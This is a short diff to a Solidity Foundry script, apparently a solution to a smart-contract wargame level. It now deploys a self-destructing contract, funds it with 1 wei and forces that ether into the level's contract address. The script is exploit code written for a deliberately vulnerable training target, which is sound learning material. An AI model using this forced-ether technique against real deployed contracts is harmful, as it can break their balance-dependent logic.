@@ -6,12 +6,12 @@ import "../src/Level07.sol";
 import "../src/AttackerSelfDestruct.sol";
 
 contract AttackerScript is Script {
-    Level07 level07 = Level07(0xC937D47b2567Bbe624cF9317252dAae1BD7bCF58);
-    //TODO add deployment of selfdestruct directly in script
-    SelfDestruct attacker = SelfDestruct(payable(0xAcED7c5Fa3C803a8f2C2487196a46F3313705f38));
+    Level07 level07 = Level07(0xF3c3Ca4368b9eA33031Fe8aB80b2D93d4Bdde39d);
 
     function run() public {
       vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+      //Input your level instance
+      SelfDestruct attacker = new SelfDestruct();
       (bool success, ) = address(attacker).call{value: 1 wei}("");
       require(success);
       attacker.selfDestruct(payable(address(level07)));
